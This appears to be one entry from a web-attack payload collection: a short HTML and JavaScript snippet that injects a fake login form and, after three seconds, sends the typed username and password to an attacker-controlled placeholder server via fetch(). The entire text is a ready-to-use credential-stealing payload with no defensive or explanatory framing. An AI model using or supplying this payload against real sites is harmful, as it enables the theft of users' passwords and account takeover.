### Fake authentication form sending credentials in keylogger mode

    <input type="text" name="username" id="username" /><input type="password" name="password" id="password" /><script>function sleep(ms){return new Promise(r => setTimeout(r,ms));}sleep(3000).then(()=> {var user =document.getElementById('username').value;var pass = document.getElementById('password').value;var user_pass = user+"_"+pass;fetch("https://[YOUR_SERVER]?u="+user_pass);});</script>
